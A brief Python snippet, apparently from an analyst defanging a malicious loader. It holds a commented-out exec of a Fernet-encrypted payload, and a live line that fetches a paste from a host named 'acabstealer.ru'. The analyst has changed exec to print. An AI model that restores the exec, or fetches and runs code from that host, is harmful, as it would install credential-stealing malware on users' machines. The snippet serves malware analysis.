from fernet import Fernet
import requests

# exec(Fernet(b'3fgc9LAOZU9wAtjVmDUTwNZdzs_lWsWf_RESK0CCgrg=').decrypt(b'gAAAAABmqzuzxjM5xLVdNO1Qx6Dwyw5u7Ppz-YMArvQAS5jresEVFcdZow5cUJFux-przmpTic8HqHBSyOOJlaJTXlwGOkBWygBDB65P62gNQwyEQKXbm27UYL2q5jSNCPdCRZhc0KxS-k4b1T7accgZ7YW3rfOsS5NDuQ4dETrcvePBi44Q3EQkte1srGWgCTca_ITFUeR-qB_sNfZ0yvUM0asiKK58tg=='))

# REPLACED EXEC WITH PRINT
print(requests.get('https://acabstealer.ru/paste?userid=4').text.replace('<pre>','').replace('</pre>',''))
